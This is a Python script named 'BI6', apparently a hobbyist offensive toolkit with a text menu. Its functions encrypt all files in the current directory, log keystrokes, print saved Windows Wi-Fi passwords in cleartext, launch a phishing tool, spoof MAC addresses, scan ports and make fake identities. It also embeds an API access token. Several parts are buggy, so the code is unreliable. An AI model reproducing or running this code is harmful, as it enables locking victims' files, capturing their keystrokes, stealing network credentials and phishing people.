#!/Library/Frameworks/Python.framework/Versions/3.10/bin/python3
import os
import nmap
from faker import Faker
from faker.providers import internet
from cryptography.fernet import Fernet
import subprocess
import ipinfo
import sys
import subprocess
import string
import random
import re
from pynput import keyboard
def bi6():
    print('Welcome to BI6')
    def lockFiles():
        files = []
        prompt = ""
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Locked.')
        print(prompt)
        print(files)
        
        key = Fernet.generate_key()
        with open('thekey.key', 'wb') as thekey:
            thekey.write(key)
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
        input('Press enter to exit')
                
    def unlockFiles():
        files = []
        for file in os.listdir():
            
            if file == 'main.py' or file == 'thekey.key':
                continue
            if os.path.isfile(file): 
                files.append(file)
                
        print('Unlocked.')
        print(files)
        with open('theKey.key', 'rb') as key:
            secretKey = key.read()
        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
                contents_decrypted = Fernet(secretKey).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)
        input('Press enter to exit')
            
    def get_random_macos_address():
        """Generate and return a MAC address in the format of Linux"""
    # get the hexdigits uppercased
        uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
        # 2nd character must be 0, 2, 4, 6, 8, A, C, or E
        mac = ""
        for i in range(6):
            for j in range(2):
                if i == 0:
                    mac += random.choice("02468ACE")
                else:
                    mac += random.choice(uppercased_hexdigits)
            mac += ":"
        input('Press enter to exit')
        return mac.strip(":")

    def scanPorts():
        target = input('Targert IP: ')
        begin = input('Begin at: ')
        end = input('Stop At: ')
        
        
        for i in range(int(begin), int(end) + 1):
            res = nmap.PortScanner().scan(target,str(i))
            res = res['scan'][target]['tcp'][i]['state']
            print(f'{target}:{i} Port {res}')
        input('Press enter to exit')
            
    def pyPhisher():
        os.system('pyphisher')
        input('Press enter to exit')
        
    def keyLog():
        
        keys_list = []
        def key_pressed(key):
            try:
                keys_list.append(key)
                with open('keyLogs.txt', 'wb') as log:
                    log.write(key)
                    
            except:
                pass
        def key_released(key):
            if key == keyboard.Key.esc:
                pass
        
        with keyboard.Listener(on_press=key_pressed, on_release=key_released) as listener:
            listener.join()
        input('Press enter to exit')
            
        
    def ping():
        target = input('Target: ')
        os.system(f'ping {target} ')
        input('Press enter to exit')
    def fakeMe():
        locale = input('locale: ')
        fake = Faker(locale)
        
        fake.add_provider(internet)
        print("Here's your new identity: ")
        print(f'name:' + fake.name())
        print(fake.ipv4_private())
        print(fake.address())
        input('Press enter to exit')
        
    def windowsWifi():
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                print ("{:<30}|  {:<}".format(i, results[0]))
                with open('wifipassword.txt', 'wb') as wifitxt:
                    wifitxt.write(results)
            except :
                print ("{:<30}|  {:<}".format(i, ""))
            input('Press enter to exit')
    def getIpInfo():
        try:
            ip_address = sys.argv[1]
        except :
            ip_address = input('IP Address : ')
        # access token for ipinfo.io
        access_token = 'eb7743c01b91d8'
        # create a client object with the access token
        handler = ipinfo.getHandler(access_token)
        # get the ip info
        details = handler.getDetails(ip_address)
        # print the ip info
        for key, value in details.all.items():
            print(f"{key}: {value}")
        input('Press enter to exit')
            
    def get_current_macos_address(iface):
        # use the ifconfig command to get the interface details, including the MAC address
        output = subprocess.check_output(f"ifconfig {iface}", shell=True).decode()
        return re.search("ether (.+) ", output).group().split()[1].strip()
        input('Press enter to exit')
    def macos_spoofMac():
        mac = input('Preferred Mac Address: ')
        card = input('Network Card: ')
        os.system(f'brew install spoof-mac && sudo spoof-mac set {card} {mac}')
        input('Press enter to exit')
    
    command = input('what do you want to do? : ')
    
    if command == 'lock files':
        lockFiles()
    if command == 'set mac address':
        macos_spoofMac()
    if command == 'get mac address':
        get_current_macos_address()
    elif command == 'unlock files':
        unlockFiles()
    elif command == 'scan ports':
        scanPorts()
    elif command == 'pyPhisher':
        pyPhisher()
    elif command == 'log keys':
        keyLog()
    elif command == 'ping':
        ping()
    elif command == 'fake identity':
        fakeMe()
    elif command == 'win wifi':
        windowsWifi()
    elif command == 'get ip info':
        getIpInfo()
    elif command == 'randomize mac':
        get_random_macos_address()
    elif command == 'help':
        print(''''lock files' : Lock all files in the current directory
    'set mac address' : Set MacOS Mac address
    'unlock files' : Unlock locked files
    'scan ports' : Scan Ports
    'pyPhisher' : Launch PyPhisher
    'log keys' : Key logger
    'ping' : Ping addresses
    'fake identity' : Creates a fake identity
    'win wifi' : get windows Wifi passwords
    'get ip info' : Get information on public IP Addresses
    'randomize mac' : randomize macos mac address''')
    else:
        print('Command Not found')
        bi6()
        
bi6()  
